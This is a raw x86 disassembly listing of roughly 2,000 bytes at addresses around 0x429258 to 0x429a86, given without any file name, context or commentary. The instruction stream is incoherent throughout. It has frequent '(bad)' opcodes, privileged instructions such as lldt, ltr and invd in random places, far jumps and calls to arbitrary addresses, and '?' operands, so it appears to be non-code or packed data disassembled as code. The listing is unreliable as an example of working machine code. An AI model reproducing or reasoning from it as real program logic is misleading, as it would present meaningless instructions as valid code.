  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
